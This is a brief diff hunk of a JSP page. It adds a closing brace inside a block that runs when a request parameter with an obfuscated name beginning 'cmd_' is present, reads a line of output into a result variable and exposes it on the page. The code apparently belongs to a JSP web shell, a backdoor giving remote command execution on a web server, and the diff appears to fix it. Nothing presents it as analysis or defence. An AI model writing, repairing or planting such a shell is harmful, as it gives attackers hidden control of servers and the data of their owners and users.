@@ -13,6 +13,8 @@ if (request.getParameter("cmd_cuA44dZ@xS2@!x") != null) {
   DataInputStream dis = new DataInputStream(in);
   res = dis.readLine();
   
+  }
+  
   pageContext.setAttribute("result", res);
 
 %>
